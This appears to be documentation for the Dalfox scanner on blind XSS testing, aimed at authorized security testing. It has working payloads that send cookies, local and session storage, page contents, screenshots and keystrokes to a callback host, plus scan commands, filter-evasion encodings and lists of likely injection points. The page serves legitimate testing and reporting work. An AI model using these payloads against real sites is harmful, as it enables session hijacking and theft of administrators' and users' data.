+++
title = "Blind XSS Testing"
description = "Learn how to test for blind XSS vulnerabilities using Dalfox"
weight = 3
sort_by = "weight"

[extra]
+++

# Blind XSS Testing

Blind XSS vulnerabilities occur when malicious JavaScript is injected into an application but executes in a different context, often viewed by administrators, support staff, or other users at a later time.

## What is Blind XSS?

Unlike reflected or stored XSS where you can immediately see if your payload executes, blind XSS requires out-of-band verification. The payload might execute:

- In an admin panel that you can't access
- In email notifications sent to staff
- In log viewers or monitoring dashboards
- In reports generated from user input

## Prerequisites

To test for blind XSS, you need:

1. A callback/listener URL that receives HTTP requests
2. Dalfox installed
3. Target application accepting user input

### Callback Services

Popular services for blind XSS testing:

- **Burp Collaborator** - Built into Burp Suite Professional
- **Interactsh** - Open-source alternative ([interactsh.com](https://app.interactsh.com))
- **XSS Hunter** - Specialized blind XSS platform
- **Custom Server** - Your own server logging requests

## Basic Blind XSS Testing

### Using Burp Collaborator

```bash
# Get your Burp Collaborator URL (e.g., abc123.burpcollaborator.net)
# Then run Dalfox with the -b flag

dalfox scan https://example.com -b https://abc123.burpcollaborator.net
```

### Using Interactsh

```bash
# Generate an Interactsh URL from https://app.interactsh.com
# Example: c1abc2def3.interact.sh

dalfox scan https://example.com -b https://c1abc2def3.interact.sh
```

## How It Works

When you use the `-b` flag, Dalfox:

1. Generates blind XSS payloads that include your callback URL
2. Injects these payloads into all discovered parameters
3. Submits the requests to the target
4. **Does not analyze responses** (execution happens later)

You must monitor your callback service for incoming requests that indicate successful XSS execution.

## Custom Blind Payloads

### Creating Custom Templates

Create a file with blind XSS payload templates. Use `{}` as a placeholder for the callback URL:

**blind-payloads.txt:**
```html
<script src="{}/xss.js"></script>
<img src=x onerror="fetch('{}?cookie='+document.cookie)">
<svg onload="fetch('{}?loc='+location.href)">
"><script>fetch('{}?data='+document.documentElement.innerHTML)</script>
```

### Using Custom Templates

```bash
dalfox scan https://example.com \
  -b https://your-callback.com \
  --custom-blind-xss-payload blind-payloads.txt
```

## Advanced Blind XSS Techniques

### Full Data Exfiltration

Create sophisticated payloads that extract maximum information:

**advanced-blind.txt:**
```html
<script>
fetch('{}', {
  method: 'POST',
  body: JSON.stringify({
    url: location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    dom: document.documentElement.innerHTML
  })
});
</script>
```

### Screenshot Capture

Payload that captures a screenshot (using html2canvas):

```html
<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
html2canvas(document.body).then(canvas => {
  fetch('{}', {
    method: 'POST',
    body: canvas.toDataURL()
  });
});
</script>
```

### Keylogger Payload

Capture keystrokes in the admin panel:

```html
<script>
document.addEventListener('keypress', function(e) {
  fetch('{}?key=' + e.key);
});
</script>
```

## Real-World Examples

### Example 1: Contact Form

Testing a contact form for blind XSS:

```bash
dalfox scan https://example.com/contact \
  -X POST \
  -d "name=test&email=test@example.com&message=test" \
  -b https://your-callback.burpcollaborator.net \
  -p name -p email -p message
```

If your payload executes when an admin views the contact form submission, you'll receive a callback.

### Example 2: Support Ticket System

```bash
dalfox scan https://support.example.com/submit \
  -X POST \
  -H "Authorization: Bearer token123" \
  -d "subject=Help&description=Issue&priority=high" \
  -b https://c1abc2.interact.sh \
  --custom-blind-xss-payload advanced-blind.txt
```

### Example 3: User Profile Update

```bash
dalfox scan https://example.com/api/profile \
  -X PUT \
  -H "Content-Type: application/json" \
  -H "Cookie: session=abc123" \
  -d '{"name":"test","bio":"test bio","location":"test"}' \
  -b https://your-callback.com \
  -p name -p bio -p location
```

### Example 4: Comprehensive Site Scan

Scan multiple pages with blind XSS testing:

**urls.txt:**
```
https://example.com/contact
https://example.com/feedback
https://example.com/comment
https://example.com/profile
```

```bash
dalfox scan -i file urls.txt \
  -b https://your-callback.burpcollaborator.net \
  --custom-blind-xss-payload blind-payloads.txt \
  -W params.txt \
  --remote-wordlists burp \
  -f json \
  -o blind-xss-results.json
```

## Monitoring Callbacks

### Burp Collaborator

1. Open Burp Suite Professional
2. Go to Burp → Burp Collaborator client
3. Click "Poll now" to check for interactions
4. Look for HTTP requests from your payloads

### Interactsh

1. Visit [https://app.interactsh.com](https://app.interactsh.com)
2. Copy your unique URL
3. Monitor in real-time for incoming requests
4. Each request shows source IP, headers, and timing

### Custom Server

Simple Node.js callback server:

```javascript
const express = require('express');
const app = express();

app.use(express.json());

// Log all requests
app.all('*', (req, res) => {
  console.log('=== Blind XSS Callback ===');
  console.log('Time:', new Date().toISOString());
  console.log('Method:', req.method);
  console.log('URL:', req.url);
  console.log('Headers:', req.headers);
  console.log('Body:', req.body);
  console.log('========================\n');
  
  res.status(200).send('OK');
});

app.listen(80, () => {
  console.log('Callback server running on port 80');
});
```

## Tips and Best Practices

{% collapse(title="1. Use Unique Identifiers") %}
Include unique identifiers in your callback URLs to track which parameter triggered the XSS:

```bash
dalfox scan https://example.com/contact \
  -b https://abc123.burpcollaborator.net/contact-form \
  -p name -p email -p message
```
{% end %}

{% collapse(title="2. Be Patient") %}
Blind XSS might not trigger immediately. Administrators may only view submissions:
- Once per day
- Once per week
- When processing tickets
- During audits

Keep monitoring for days or weeks.
{% end %}

{% collapse(title="3. Test Multiple Contexts") %}
Test different input points:
- Forms (contact, feedback, support)
- Profile fields (name, bio, location)
- Comments and reviews
- File uploads (metadata, filename)
- API endpoints
{% end %}

{% collapse(title="4. Respect Scope") %}
Only test applications you have permission to test. Blind XSS can affect real users and administrators.
{% end %}

{% collapse(title="5. Use HTTPS Callbacks") %}
Many modern applications won't load HTTP resources due to CSP or mixed content policies. Always use HTTPS callback URLs.
{% end %}

## Common Injection Points

### High-Value Targets

1. **Support/Help Desk Systems**
   - Ticket descriptions
   - Customer messages
   - Attachment metadata

2. **User Profile Fields**
   - Display name
   - Bio/About me
   - Location
   - Website URL

3. **Administrative Forms**
   - Feedback forms
   - Contact forms
   - Survey responses

4. **Comment Systems**
   - Blog comments
   - Product reviews
   - Forum posts

5. **Log Data**
   - User-Agent strings
   - Referer headers
   - Custom headers

## Payload Encoding

Sometimes you need encoding to bypass filters:

```bash
# URL encoding
dalfox scan https://example.com -b https://callback.com -e url

# HTML entity encoding
dalfox scan https://example.com -b https://callback.com -e html

# Base64 encoding
dalfox scan https://example.com -b https://callback.com -e base64

# Multiple encodings
dalfox scan https://example.com -b https://callback.com -e url,html,base64
```

## Verifying Success

When you receive a callback, verify it's from your blind XSS:

1. **Check timing** - Does it align with when admin would view?
2. **Check data** - Does exfiltrated data confirm execution?
3. **Check source IP** - Is it from target's infrastructure?
4. **Check User-Agent** - Admin panel might have different UA

## Reporting Blind XSS

When you find a blind XSS vulnerability, your report should include:

1. **Callback evidence** - Screenshots of the callback
2. **Injection point** - Exact parameter and endpoint
3. **Payload used** - The payload that triggered
4. **Context** - Where it executed (admin panel, email, etc.)
5. **Impact** - What could an attacker do with this access?

## See Also

- [Basic XSS Scanning](/usage_guides/basic_xss_scanning) - Standard XSS testing
- [Stored XSS Testing](/usage_guides/stored_xss_testing) - Testing stored XSS
- [Scan Command](/sub-commands/scan) - Complete scan reference
- [Custom Payloads](/usage_guides/custom_payloads) - Creating custom payloads
